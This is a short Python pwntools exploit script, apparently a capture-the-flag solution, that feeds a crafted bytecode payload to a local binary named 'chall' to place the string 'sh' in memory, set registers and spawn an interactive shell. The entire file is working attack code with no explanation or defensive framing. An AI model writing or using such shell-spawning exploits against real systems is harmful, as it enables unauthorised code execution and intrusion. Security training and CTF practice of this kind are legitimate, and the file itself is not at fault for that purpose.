from pwn import *
import time
elf = ELF("./chall")
context.binary=elf
target=process([elf.path])
#target=remote()
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

pause()
payload=p8(16)+p8(24)+p8(20)+p8(0x68)+p8(0x73)+p8(0)*2#sh in index 24, addr=0x10b00
payload+=p8(16)+p8(1)+p8(20)+p8(0)+p8(0xfb)+p8(0)*2#0xfb00 in index 1
payload+=p8(19)+p8(0x00)+p8(0x01)+p8(0x04)+p8(0x48)#set rdx
payload+=p8(16)+p8(1)#rax=1
payload+=p8(17)+p8(1)#r14=1
payload+=p8(15)

target.send(payload)

target.interactive()
